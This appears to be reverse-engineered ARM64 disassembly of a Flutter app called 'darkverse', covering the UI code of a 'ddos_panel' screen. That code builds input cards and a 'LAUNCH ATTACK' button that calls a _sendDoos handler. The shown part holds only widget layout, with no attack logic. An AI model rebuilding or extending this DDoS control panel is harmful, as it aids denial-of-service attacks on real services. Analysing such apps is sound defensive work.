    //     0x80527c: bl              #0x805970  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_buildInputCard
    // 0x805280: ldur            x1, [fp, #-0x38]
    // 0x805284: ArrayStore: r1[11] = r0  ; List_4
    //     0x805284: add             x25, x1, #0x3b
    //     0x805288: str             w0, [x25]
    //     0x80528c: tbz             w0, #0, #0x8052a8
    //     0x805290: ldurb           w16, [x1, #-1]
    //     0x805294: ldurb           w17, [x0, #-1]
    //     0x805298: and             x16, x17, x16, lsr #2
    //     0x80529c: tst             x16, HEAP, lsr #32
    //     0x8052a0: b.eq            #0x8052a8
    //     0x8052a4: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x8052a8: ldur            x1, [fp, #-0x38]
    // 0x8052ac: r16 = Instance_SizedBox
    //     0x8052ac: add             x16, PP, #0x11, lsl #12  ; [pp+0x11e10] Obj!SizedBox@a3aec1
    //     0x8052b0: ldr             x16, [x16, #0xe10]
    // 0x8052b4: StoreField: r1->field_3f = r16
    //     0x8052b4: stur            w16, [x1, #0x3f]
    // 0x8052b8: r0 = Icon()
    //     0x8052b8: bl              #0x6b0738  ; AllocateIconStub -> Icon (size=0x40)
    // 0x8052bc: mov             x1, x0
    // 0x8052c0: r0 = Instance_IconData
    //     0x8052c0: add             x0, PP, #0x40, lsl #12  ; [pp+0x40f70] Obj!IconData@a02361
    //     0x8052c4: ldr             x0, [x0, #0xf70]
    // 0x8052c8: stur            x1, [fp, #-0x10]
    // 0x8052cc: StoreField: r1->field_b = r0
    //     0x8052cc: stur            w0, [x1, #0xb]
    // 0x8052d0: ldur            x0, [fp, #-0x28]
    // 0x8052d4: StoreField: r1->field_23 = r0
    //     0x8052d4: stur            w0, [x1, #0x23]
    // 0x8052d8: r0 = TextStyle()
    //     0x8052d8: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x8052dc: mov             x1, x0
    // 0x8052e0: r0 = true
    //     0x8052e0: add             x0, NULL, #0x20  ; true
    // 0x8052e4: stur            x1, [fp, #-0x18]
    // 0x8052e8: StoreField: r1->field_7 = r0
    //     0x8052e8: stur            w0, [x1, #7]
    // 0x8052ec: ldur            x2, [fp, #-0x28]
    // 0x8052f0: StoreField: r1->field_b = r2
    //     0x8052f0: stur            w2, [x1, #0xb]
    // 0x8052f4: r2 = 16.000000
    //     0x8052f4: add             x2, PP, #0x12, lsl #12  ; [pp+0x12008] 16
    //     0x8052f8: ldr             x2, [x2, #8]
    // 0x8052fc: StoreField: r1->field_1f = r2
    //     0x8052fc: stur            w2, [x1, #0x1f]
    // 0x805300: r2 = Instance_FontWeight
    //     0x805300: add             x2, PP, #0xc, lsl #12  ; [pp+0xcf08] Obj!FontWeight@a0c471
    //     0x805304: ldr             x2, [x2, #0xf08]
    // 0x805308: StoreField: r1->field_23 = r2
    //     0x805308: stur            w2, [x1, #0x23]
    // 0x80530c: r2 = 1.200000
    //     0x80530c: add             x2, PP, #0xc, lsl #12  ; [pp+0xcf18] 1.2
    //     0x805310: ldr             x2, [x2, #0xf18]
    // 0x805314: StoreField: r1->field_2b = r2
    //     0x805314: stur            w2, [x1, #0x2b]
    // 0x805318: r2 = "Orbitron"
    //     0x805318: add             x2, PP, #0xc, lsl #12  ; [pp+0xcf20] "Orbitron"
    //     0x80531c: ldr             x2, [x2, #0xf20]
    // 0x805320: StoreField: r1->field_13 = r2
    //     0x805320: stur            w2, [x1, #0x13]
    // 0x805324: r0 = Text()
    //     0x805324: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x805328: mov             x1, x0
    // 0x80532c: r0 = "LAUNCH ATTACK"
    //     0x80532c: add             x0, PP, #0x40, lsl #12  ; [pp+0x40f78] "LAUNCH ATTACK"
    //     0x805330: ldr             x0, [x0, #0xf78]
    // 0x805334: stur            x1, [fp, #-0x28]
    // 0x805338: StoreField: r1->field_b = r0
    //     0x805338: stur            w0, [x1, #0xb]
    // 0x80533c: ldur            x0, [fp, #-0x18]
    // 0x805340: StoreField: r1->field_13 = r0
    //     0x805340: stur            w0, [x1, #0x13]
    // 0x805344: r0 = Radius()
    //     0x805344: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x805348: d0 = 16.000000
    //     0x805348: fmov            d0, #16.00000000
    // 0x80534c: stur            x0, [fp, #-0x18]
    // 0x805350: StoreField: r0->field_7 = d0
    //     0x805350: stur            d0, [x0, #7]
    // 0x805354: StoreField: r0->field_f = d0
    //     0x805354: stur            d0, [x0, #0xf]
    // 0x805358: r0 = BorderRadius()
    //     0x805358: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x80535c: mov             x1, x0
    // 0x805360: ldur            x0, [fp, #-0x18]
    // 0x805364: stur            x1, [fp, #-0x30]
    // 0x805368: StoreField: r1->field_7 = r0
    //     0x805368: stur            w0, [x1, #7]
    // 0x80536c: StoreField: r1->field_b = r0
    //     0x80536c: stur            w0, [x1, #0xb]
    // 0x805370: StoreField: r1->field_f = r0
    //     0x805370: stur            w0, [x1, #0xf]
    // 0x805374: StoreField: r1->field_13 = r0
    //     0x805374: stur            w0, [x1, #0x13]
    // 0x805378: r0 = RoundedRectangleBorder()
    //     0x805378: bl              #0x58ce88  ; AllocateRoundedRectangleBorderStub -> RoundedRectangleBorder (size=0x10)
    // 0x80537c: mov             x2, x0
    // 0x805380: ldur            x0, [fp, #-0x30]
    // 0x805384: stur            x2, [fp, #-0x18]
    // 0x805388: StoreField: r2->field_b = r0
    //     0x805388: stur            w0, [x2, #0xb]
    // 0x80538c: r0 = Instance_BorderSide
    //     0x80538c: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd70] Obj!BorderSide@a28af1
    //     0x805390: ldr             x0, [x0, #0xd70]
    // 0x805394: StoreField: r2->field_7 = r0
    //     0x805394: stur            w0, [x2, #7]
    // 0x805398: r1 = Instance_Color
    //     0x805398: add             x1, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x80539c: ldr             x1, [x1, #0xf80]
    // 0x8053a0: d0 = 0.600000
    //     0x8053a0: add             x17, PP, #0xb, lsl #12  ; [pp+0xb5c0] IMM: double(0.6) from 0x3fe3333333333333
    //     0x8053a4: ldr             d0, [x17, #0x5c0]
    // 0x8053a8: r0 = withOpacity()
    //     0x8053a8: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x8053ac: r16 = Instance_EdgeInsets
    //     0x8053ac: add             x16, PP, #0x16, lsl #12  ; [pp+0x16d68] Obj!EdgeInsets@a06111
    //     0x8053b0: ldr             x16, [x16, #0xd68]
    // 0x8053b4: ldur            lr, [fp, #-0x18]
    // 0x8053b8: stp             lr, x16, [SP, #0x10]
    // 0x8053bc: r16 = 6.000000
    //     0x8053bc: add             x16, PP, #0xd, lsl #12  ; [pp+0xdab8] 6
    //     0x8053c0: ldr             x16, [x16, #0xab8]
    // 0x8053c4: stp             x0, x16, [SP]
    // 0x8053c8: r1 = Instance_Color
    //     0x8053c8: add             x1, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x8053cc: ldr             x1, [x1, #0xf80]
    // 0x8053d0: r4 = const [0, 0x5, 0x4, 0x1, elevation, 0x3, padding, 0x1, shadowColor, 0x4, shape, 0x2, null]
    //     0x8053d0: add             x4, PP, #0x40, lsl #12  ; [pp+0x40f80] List(13) [0, 0x5, 0x4, 0x1, "elevation", 0x3, "padding", 0x1, "shadowColor", 0x4, "shape", 0x2, Null]
    //     0x8053d4: ldr             x4, [x4, #0xf80]
    // 0x8053d8: r0 = styleFrom()
    //     0x8053d8: bl              #0x6a6e2c  ; [package:flutter/src/material/elevated_button.dart] ElevatedButton::styleFrom
    // 0x8053dc: ldur            x2, [fp, #-8]
    // 0x8053e0: r1 = Function '_sendDoos@230213185':.
    //     0x8053e0: add             x1, PP, #0x40, lsl #12  ; [pp+0x40f88] AnonymousClosure: (0x806008), in [package:darkverse/ddos_panel.dart] _AttackPanelState::_sendDoos (0x806040)
    //     0x8053e4: ldr             x1, [x1, #0xf88]
    // 0x8053e8: stur            x0, [fp, #-8]
    // 0x8053ec: r0 = AllocateClosure()
    //     0x8053ec: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x8053f0: stur            x0, [fp, #-0x18]
    // 0x8053f4: r0 = ElevatedButton()
    //     0x8053f4: bl              #0x6b0714  ; AllocateElevatedButtonStub -> ElevatedButton (size=0x40)
    // 0x8053f8: mov             x1, x0
    // 0x8053fc: ldur            x2, [fp, #-0x10]
    // 0x805400: ldur            x3, [fp, #-0x28]
    // 0x805404: ldur            x5, [fp, #-0x18]
    // 0x805408: ldur            x6, [fp, #-8]
    // 0x80540c: stur            x0, [fp, #-8]
    // 0x805410: r0 = ElevatedButton.icon()
    //     0x805410: bl              #0x6b83a8  ; [package:flutter/src/material/elevated_button.dart] ElevatedButton::ElevatedButton.icon
    // 0x805414: r0 = SizedBox()
    //     0x805414: bl              #0x6b184c  ; AllocateSizedBoxStub -> SizedBox (size=0x18)
    // 0x805418: mov             x1, x0
    // 0x80541c: r0 = inf
    //     0x80541c: add             x0, PP, #0x14, lsl #12  ; [pp+0x145d0] inf
    //     0x805420: ldr             x0, [x0, #0x5d0]
    // 0x805424: StoreField: r1->field_f = r0
    //     0x805424: stur            w0, [x1, #0xf]
    // 0x805428: ldur            x0, [fp, #-8]
    // 0x80542c: StoreField: r1->field_b = r0
    //     0x80542c: stur            w0, [x1, #0xb]
    // 0x805430: mov             x0, x1
    // 0x805434: ldur            x1, [fp, #-0x38]
    // 0x805438: ArrayStore: r1[13] = r0  ; List_4
    //     0x805438: add             x25, x1, #0x43
    //     0x80543c: str             w0, [x25]
    //     0x805440: tbz             w0, #0, #0x80545c
    //     0x805444: ldurb           w16, [x1, #-1]
    //     0x805448: ldurb           w17, [x0, #-1]
    //     0x80544c: and             x16, x17, x16, lsr #2
    //     0x805450: tst             x16, HEAP, lsr #32
    //     0x805454: b.eq            #0x80545c
    //     0x805458: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x80545c: r1 = <Widget>
    //     0x80545c: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x805460: r0 = AllocateGrowableArray()
    //     0x805460: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x805464: mov             x1, x0
    // 0x805468: ldur            x0, [fp, #-0x38]
    // 0x80546c: stur            x1, [fp, #-8]
    // 0x805470: StoreField: r1->field_f = r0
    //     0x805470: stur            w0, [x1, #0xf]
    // 0x805474: r0 = 28
    //     0x805474: mov             x0, #0x1c
    // 0x805478: StoreField: r1->field_b = r0
    //     0x805478: stur            w0, [x1, #0xb]
    // 0x80547c: r0 = Column()
    //     0x80547c: bl              #0x641538  ; AllocateColumnStub -> Column (size=0x38)
    // 0x805480: mov             x1, x0
    // 0x805484: r0 = Instance_Axis
    //     0x805484: ldr             x0, [PP, #0x46d0]  ; [pp+0x46d0] Obj!Axis@a40801
    // 0x805488: stur            x1, [fp, #-0x10]
    // 0x80548c: StoreField: r1->field_f = r0
    //     0x80548c: stur            w0, [x1, #0xf]
    // 0x805490: r2 = Instance_MainAxisAlignment
    //     0x805490: ldr             x2, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x805494: StoreField: r1->field_13 = r2
    //     0x805494: stur            w2, [x1, #0x13]
    // 0x805498: r2 = Instance_MainAxisSize
    //     0x805498: add             x2, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x80549c: ldr             x2, [x2, #0xbc0]
    // 0x8054a0: ArrayStore: r1[0] = r2  ; List_4
    //     0x8054a0: stur            w2, [x1, #0x17]
    // 0x8054a4: r2 = Instance_CrossAxisAlignment
    //     0x8054a4: ldr             x2, [PP, #0x6f88]  ; [pp+0x6f88] Obj!CrossAxisAlignment@a402c1
    // 0x8054a8: StoreField: r1->field_1b = r2
    //     0x8054a8: stur            w2, [x1, #0x1b]
    // 0x8054ac: r2 = Instance_VerticalDirection
    //     0x8054ac: ldr             x2, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x8054b0: StoreField: r1->field_23 = r2
    //     0x8054b0: stur            w2, [x1, #0x23]
    // 0x8054b4: r2 = Instance_Clip
    //     0x8054b4: ldr             x2, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x8054b8: StoreField: r1->field_2b = r2
    //     0x8054b8: stur            w2, [x1, #0x2b]
    // 0x8054bc: StoreField: r1->field_2f = rZR
    //     0x8054bc: stur            xzr, [x1, #0x2f]
    // 0x8054c0: ldur            x2, [fp, #-8]
    // 0x8054c4: StoreField: r1->field_b = r2
    //     0x8054c4: stur            w2, [x1, #0xb]
    // 0x8054c8: r0 = SingleChildScrollView()
    //     0x8054c8: bl              #0x6aa334  ; AllocateSingleChildScrollViewStub -> SingleChildScrollView (size=0x3c)
    // 0x8054cc: mov             x1, x0
    // 0x8054d0: r0 = Instance_Axis
    //     0x8054d0: ldr             x0, [PP, #0x46d0]  ; [pp+0x46d0] Obj!Axis@a40801
    // 0x8054d4: stur            x1, [fp, #-8]
    // 0x8054d8: StoreField: r1->field_b = r0
    //     0x8054d8: stur            w0, [x1, #0xb]
    // 0x8054dc: r0 = false
    //     0x8054dc: add             x0, NULL, #0x30  ; false
    // 0x8054e0: StoreField: r1->field_f = r0
    //     0x8054e0: stur            w0, [x1, #0xf]
    // 0x8054e4: r2 = Instance_EdgeInsets
    //     0x8054e4: ldr             x2, [PP, #0x5348]  ; [pp+0x5348] Obj!EdgeInsets@a05fc1
    // 0x8054e8: StoreField: r1->field_13 = r2
    //     0x8054e8: stur            w2, [x1, #0x13]
    // 0x8054ec: ldur            x2, [fp, #-0x10]
    // 0x8054f0: StoreField: r1->field_23 = r2
    //     0x8054f0: stur            w2, [x1, #0x23]
    // 0x8054f4: r2 = Instance_DragStartBehavior
    //     0x8054f4: ldr             x2, [PP, #0x5090]  ; [pp+0x5090] Obj!DragStartBehavior@a418a1
    // 0x8054f8: StoreField: r1->field_27 = r2
    //     0x8054f8: stur            w2, [x1, #0x27]
    // 0x8054fc: r3 = Instance_Clip
    //     0x8054fc: add             x3, PP, #0xc, lsl #12  ; [pp+0xca18] Obj!Clip@a43d61
    //     0x805500: ldr             x3, [x3, #0xa18]
    // 0x805504: StoreField: r1->field_2b = r3
    //     0x805504: stur            w3, [x1, #0x2b]
    // 0x805508: r3 = Instance_HitTestBehavior
    //     0x805508: add             x3, PP, #0xc, lsl #12  ; [pp+0xcc18] Obj!HitTestBehavior@a40181
    //     0x80550c: ldr             x3, [x3, #0xc18]
    // 0x805510: StoreField: r1->field_2f = r3
    //     0x805510: stur            w3, [x1, #0x2f]
    // 0x805514: r0 = SafeArea()
    //     0x805514: bl              #0x641514  ; AllocateSafeAreaStub -> SafeArea (size=0x28)
    // 0x805518: mov             x1, x0
    // 0x80551c: r0 = true
    //     0x80551c: add             x0, NULL, #0x20  ; true
    // 0x805520: stur            x1, [fp, #-0x10]
    // 0x805524: StoreField: r1->field_b = r0
    //     0x805524: stur            w0, [x1, #0xb]
    // 0x805528: StoreField: r1->field_f = r0
    //     0x805528: stur            w0, [x1, #0xf]
    // 0x80552c: StoreField: r1->field_13 = r0
    //     0x80552c: stur            w0, [x1, #0x13]
    // 0x805530: ArrayStore: r1[0] = r0  ; List_4
    //     0x805530: stur            w0, [x1, #0x17]
    // 0x805534: r2 = Instance_EdgeInsets
    //     0x805534: ldr             x2, [PP, #0x4fe8]  ; [pp+0x4fe8] Obj!EdgeInsets@a05ff1
    // 0x805538: StoreField: r1->field_1b = r2
    //     0x805538: stur            w2, [x1, #0x1b]
    // 0x80553c: r2 = false
    //     0x80553c: add             x2, NULL, #0x30  ; false
    // 0x805540: StoreField: r1->field_1f = r2
    //     0x805540: stur            w2, [x1, #0x1f]
    // 0x805544: ldur            x3, [fp, #-8]
    // 0x805548: StoreField: r1->field_23 = r3
    //     0x805548: stur            w3, [x1, #0x23]
    // 0x80554c: r0 = Scaffold()
    //     0x80554c: bl              #0x6945f0  ; AllocateScaffoldStub -> Scaffold (size=0x78)
    // 0x805550: ldur            x1, [fp, #-0x20]
    // 0x805554: ArrayStore: r0[0] = r1  ; List_4
    //     0x805554: stur            w1, [x0, #0x17]
    // 0x805558: ldur            x1, [fp, #-0x10]
    // 0x80555c: StoreField: r0->field_1b = r1
    //     0x80555c: stur            w1, [x0, #0x1b]
    // 0x805560: r1 = Instance_AlignmentDirectional
    //     0x805560: add             x1, PP, #0xd, lsl #12  ; [pp+0xd168] Obj!AlignmentDirectional@a09c31
    //     0x805564: ldr             x1, [x1, #0x168]
    // 0x805568: StoreField: r0->field_2f = r1
    //     0x805568: stur            w1, [x0, #0x2f]
    // 0x80556c: r1 = Instance_Color
    //     0x80556c: add             x1, PP, #0xb, lsl #12  ; [pp+0xbdc0] Obj!Color@a0e491
    //     0x805570: ldr             x1, [x1, #0xdc0]
    // 0x805574: StoreField: r0->field_4f = r1
    //     0x805574: stur            w1, [x0, #0x4f]
    // 0x805578: r1 = true
    //     0x805578: add             x1, NULL, #0x20  ; true
    // 0x80557c: StoreField: r0->field_5f = r1
    //     0x80557c: stur            w1, [x0, #0x5f]
    // 0x805580: r2 = Instance_DragStartBehavior
    //     0x805580: ldr             x2, [PP, #0x5090]  ; [pp+0x5090] Obj!DragStartBehavior@a418a1
    // 0x805584: StoreField: r0->field_63 = r2
    //     0x805584: stur            w2, [x0, #0x63]
    // 0x805588: r2 = false
    //     0x805588: add             x2, NULL, #0x30  ; false
    // 0x80558c: StoreField: r0->field_b = r2
    //     0x80558c: stur            w2, [x0, #0xb]
    // 0x805590: StoreField: r0->field_f = r1
    //     0x805590: stur            w1, [x0, #0xf]
    // 0x805594: StoreField: r0->field_13 = r2
    //     0x805594: stur            w2, [x0, #0x13]
    // 0x805598: r2 = Closure: (BuildContext, Animation<double>) => Widget from Function '_defaultBottomSheetScrimBuilder@89420462': static.
    //     0x805598: add             x2, PP, #0xd, lsl #12  ; [pp+0xd170] Closure: (BuildContext, Animation<double>) => Widget from Function '_defaultBottomSheetScrimBuilder@89420462': static. (0x75b335bba4)
    //     0x80559c: ldr             x2, [x2, #0x170]
    // 0x8055a0: StoreField: r0->field_4b = r2
    //     0x8055a0: stur            w2, [x0, #0x4b]
    // 0x8055a4: StoreField: r0->field_6b = r1
    //     0x8055a4: stur            w1, [x0, #0x6b]
    // 0x8055a8: StoreField: r0->field_6f = r1
    //     0x8055a8: stur            w1, [x0, #0x6f]
    // 0x8055ac: LeaveFrame
    //     0x8055ac: mov             SP, fp
    //     0x8055b0: ldp             fp, lr, [SP], #0x10
    // 0x8055b4: ret
    //     0x8055b4: ret             
    // 0x8055b8: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x8055b8: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x8055bc: b               #0x804838
    // 0x8055c0: r9 = _controller
    //     0x8055c0: add             x9, PP, #0x40, lsl #12  ; [pp+0x40ed0] Field <_AttackPanelState@230213185._controller@230213185>: late (offset: 0x28)
    //     0x8055c4: ldr             x9, [x9, #0xed0]
    // 0x8055c8: r0 = LateInitializationErrorSharedWithoutFPURegs()
    //     0x8055c8: bl              #0xbf85ec  ; LateInitializationErrorSharedWithoutFPURegsStub
    // 0x8055cc: SaveReg d0
    //     0x8055cc: str             q0, [SP, #-0x10]!
    // 0x8055d0: stp             x0, x1, [SP, #-0x10]!
    // 0x8055d4: r0 = 76
    //     0x8055d4: mov             x0, #0x4c
    // 0x8055d8: r30 = DoubleToIntegerStub
    //     0x8055d8: ldr             lr, [PP, #0x1590]  ; [pp+0x1590] Stub: DoubleToInteger (0x451890)
    // 0x8055dc: LoadField: r30 = r30->field_7
    //     0x8055dc: ldur            lr, [lr, #7]
    // 0x8055e0: blr             lr
    // 0x8055e4: mov             x2, x0
    // 0x8055e8: ldp             x0, x1, [SP], #0x10
    // 0x8055ec: RestoreReg d0
    //     0x8055ec: ldr             q0, [SP], #0x10
    // 0x8055f0: b               #0x804f38
    // 0x8055f4: SaveReg d0
    //     0x8055f4: str             q0, [SP, #-0x10]!
    // 0x8055f8: stp             x0, x3, [SP, #-0x10]!
    // 0x8055fc: r0 = 76
    //     0x8055fc: mov             x0, #0x4c
    // 0x805600: r30 = DoubleToIntegerStub
    //     0x805600: ldr             lr, [PP, #0x1590]  ; [pp+0x1590] Stub: DoubleToInteger (0x451890)
    // 0x805604: LoadField: r30 = r30->field_7
    //     0x805604: ldur            lr, [lr, #7]
    // 0x805608: blr             lr
    // 0x80560c: mov             x4, x0
    // 0x805610: ldp             x0, x3, [SP], #0x10
    // 0x805614: RestoreReg d0
    //     0x805614: ldr             q0, [SP], #0x10
    // 0x805618: b               #0x804fd4
    // 0x80561c: r0 = NullCastErrorSharedWithoutFPURegs()
    //     0x80561c: bl              #0xbf8364  ; NullCastErrorSharedWithoutFPURegsStub
  }
  _ _buildInputCard(/* No info */) {
    // ** addr: 0x805970, size: 0x354
    // 0x805970: EnterFrame
    //     0x805970: stp             fp, lr, [SP, #-0x10]!
    //     0x805974: mov             fp, SP
    // 0x805978: AllocStack(0x58)
    //     0x805978: sub             SP, SP, #0x58
    // 0x80597c: SetupParameters(_AttackPanelState this /* r1 => r1, fp-0x8 */, dynamic _ /* r2 => r2, fp-0x10 */, dynamic _ /* r3 => r3, fp-0x18 */, dynamic _ /* r5 => r5, fp-0x20 */)
    //     0x80597c: stur            x1, [fp, #-8]
    //     0x805980: stur            x2, [fp, #-0x10]
    //     0x805984: stur            x3, [fp, #-0x18]
    //     0x805988: stur            x5, [fp, #-0x20]
    // 0x80598c: CheckStackOverflow
    //     0x80598c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x805990: cmp             SP, x16
    //     0x805994: b.ls            #0x805cbc
    // 0x805998: r0 = Radius()
    //     0x805998: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x80599c: d0 = 16.000000
    //     0x80599c: fmov            d0, #16.00000000
    // 0x8059a0: stur            x0, [fp, #-0x28]
    // 0x8059a4: StoreField: r0->field_7 = d0
    //     0x8059a4: stur            d0, [x0, #7]
    // 0x8059a8: StoreField: r0->field_f = d0
    //     0x8059a8: stur            d0, [x0, #0xf]
    // 0x8059ac: r0 = BorderRadius()
    //     0x8059ac: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x8059b0: mov             x2, x0
    // 0x8059b4: ldur            x0, [fp, #-0x28]
    // 0x8059b8: stur            x2, [fp, #-0x30]
    // 0x8059bc: StoreField: r2->field_7 = r0
    //     0x8059bc: stur            w0, [x2, #7]
    // 0x8059c0: StoreField: r2->field_b = r0
    //     0x8059c0: stur            w0, [x2, #0xb]
    // 0x8059c4: StoreField: r2->field_f = r0
    //     0x8059c4: stur            w0, [x2, #0xf]
    // 0x8059c8: StoreField: r2->field_13 = r0
    //     0x8059c8: stur            w0, [x2, #0x13]
    // 0x8059cc: r1 = Instance_Color
    //     0x8059cc: add             x1, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x8059d0: ldr             x1, [x1, #0xf80]
    // 0x8059d4: d0 = 0.500000
    //     0x8059d4: fmov            d0, #0.50000000
    // 0x8059d8: r0 = withOpacity()
    //     0x8059d8: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x8059dc: r16 = 1.000000
    //     0x8059dc: ldr             x16, [PP, #0x4948]  ; [pp+0x4948] 1
    // 0x8059e0: stp             x16, x0, [SP]
    // 0x8059e4: r1 = Null
    //     0x8059e4: mov             x1, NULL
    // 0x8059e8: r4 = const [0, 0x3, 0x2, 0x1, color, 0x1, width, 0x2, null]
    //     0x8059e8: add             x4, PP, #0xc, lsl #12  ; [pp+0xcc78] List(9) [0, 0x3, 0x2, 0x1, "color", 0x1, "width", 0x2, Null]
    //     0x8059ec: ldr             x4, [x4, #0xc78]
    // 0x8059f0: r0 = Border.all()
    //     0x8059f0: bl              #0x6b0744  ; [package:flutter/src/painting/box_border.dart] Border::Border.all
    // 0x8059f4: r1 = Instance_Color
    //     0x8059f4: add             x1, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x8059f8: ldr             x1, [x1, #0xf80]
    // 0x8059fc: d0 = 0.200000
    //     0x8059fc: add             x17, PP, #0xc, lsl #12  ; [pp+0xc150] IMM: double(0.2) from 0x3fc999999999999a
    //     0x805a00: ldr             d0, [x17, #0x150]
    // 0x805a04: stur            x0, [fp, #-0x28]
    // 0x805a08: r0 = withOpacity()
    //     0x805a08: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x805a0c: stur            x0, [fp, #-0x38]
    // 0x805a10: r0 = BoxShadow()
    //     0x805a10: bl              #0x5b73a8  ; AllocateBoxShadowStub -> BoxShadow (size=0x24)
    // 0x805a14: d0 = 1.000000
    //     0x805a14: fmov            d0, #1.00000000
    // 0x805a18: stur            x0, [fp, #-0x40]
    // 0x805a1c: ArrayStore: r0[0] = d0  ; List_8
    //     0x805a1c: stur            d0, [x0, #0x17]
    // 0x805a20: r1 = Instance_BlurStyle
    //     0x805a20: add             x1, PP, #0xc, lsl #12  ; [pp+0xcc80] Obj!BlurStyle@a43cc1
    //     0x805a24: ldr             x1, [x1, #0xc80]
    // 0x805a28: StoreField: r0->field_1f = r1
    //     0x805a28: stur            w1, [x0, #0x1f]
    // 0x805a2c: ldur            x1, [fp, #-0x38]
    // 0x805a30: StoreField: r0->field_7 = r1
    //     0x805a30: stur            w1, [x0, #7]
    // 0x805a34: r1 = Instance_Offset
    //     0x805a34: ldr             x1, [PP, #0x2ab8]  ; [pp+0x2ab8] Obj!Offset@a13161
    // 0x805a38: StoreField: r0->field_b = r1
    //     0x805a38: stur            w1, [x0, #0xb]
    // 0x805a3c: d0 = 8.000000
    //     0x805a3c: fmov            d0, #8.00000000
    // 0x805a40: StoreField: r0->field_f = d0
    //     0x805a40: stur            d0, [x0, #0xf]
    // 0x805a44: r1 = Null
    //     0x805a44: mov             x1, NULL
    // 0x805a48: r2 = 2
    //     0x805a48: mov             x2, #2
    // 0x805a4c: r0 = AllocateArray()
    //     0x805a4c: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x805a50: mov             x2, x0
    // 0x805a54: ldur            x0, [fp, #-0x40]
    // 0x805a58: stur            x2, [fp, #-0x38]
    // 0x805a5c: StoreField: r2->field_f = r0
    //     0x805a5c: stur            w0, [x2, #0xf]
    // 0x805a60: r1 = <BoxShadow>
    //     0x805a60: add             x1, PP, #0xc, lsl #12  ; [pp+0xcc88] TypeArguments: <BoxShadow>
    //     0x805a64: ldr             x1, [x1, #0xc88]
    // 0x805a68: r0 = AllocateGrowableArray()
    //     0x805a68: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x805a6c: mov             x1, x0
    // 0x805a70: ldur            x0, [fp, #-0x38]
    // 0x805a74: stur            x1, [fp, #-0x40]
    // 0x805a78: StoreField: r1->field_f = r0
    //     0x805a78: stur            w0, [x1, #0xf]
    // 0x805a7c: r0 = 2
    //     0x805a7c: mov             x0, #2
    // 0x805a80: StoreField: r1->field_b = r0
    //     0x805a80: stur            w0, [x1, #0xb]
    // 0x805a84: r0 = BoxDecoration()
    //     0x805a84: bl              #0x63648c  ; AllocateBoxDecorationStub -> BoxDecoration (size=0x28)
    // 0x805a88: mov             x1, x0
    // 0x805a8c: r0 = Instance_Color
    //     0x805a8c: add             x0, PP, #0x32, lsl #12  ; [pp+0x32fa0] Obj!Color@a11491
    //     0x805a90: ldr             x0, [x0, #0xfa0]
    // 0x805a94: stur            x1, [fp, #-0x38]
    // 0x805a98: StoreField: r1->field_7 = r0
    //     0x805a98: stur            w0, [x1, #7]
    // 0x805a9c: ldur            x0, [fp, #-0x28]
    // 0x805aa0: StoreField: r1->field_f = r0
    //     0x805aa0: stur            w0, [x1, #0xf]
    // 0x805aa4: ldur            x0, [fp, #-0x30]
    // 0x805aa8: StoreField: r1->field_13 = r0
    //     0x805aa8: stur            w0, [x1, #0x13]
    // 0x805aac: ldur            x0, [fp, #-0x40]
    // 0x805ab0: ArrayStore: r1[0] = r0  ; List_4
    //     0x805ab0: stur            w0, [x1, #0x17]
    // 0x805ab4: r0 = Instance_BoxShape
    //     0x805ab4: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd78] Obj!BoxShape@a406a1
    //     0x805ab8: ldr             x0, [x0, #0xd78]
    // 0x805abc: StoreField: r1->field_23 = r0
    //     0x805abc: stur            w0, [x1, #0x23]
    // 0x805ac0: r0 = Icon()
    //     0x805ac0: bl              #0x6b0738  ; AllocateIconStub -> Icon (size=0x40)
    // 0x805ac4: mov             x1, x0
    // 0x805ac8: ldur            x0, [fp, #-0x18]
    // 0x805acc: stur            x1, [fp, #-0x28]
    // 0x805ad0: StoreField: r1->field_b = r0
    //     0x805ad0: stur            w0, [x1, #0xb]
    // 0x805ad4: r0 = 20.000000
    //     0x805ad4: add             x0, PP, #0xd, lsl #12  ; [pp+0xd9f8] 20
    //     0x805ad8: ldr             x0, [x0, #0x9f8]
    // 0x805adc: StoreField: r1->field_f = r0
    //     0x805adc: stur            w0, [x1, #0xf]
    // 0x805ae0: r0 = Instance_Color
    //     0x805ae0: add             x0, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x805ae4: ldr             x0, [x0, #0xf80]
    // 0x805ae8: StoreField: r1->field_23 = r0
    //     0x805ae8: stur            w0, [x1, #0x23]
    // 0x805aec: ldur            x0, [fp, #-8]
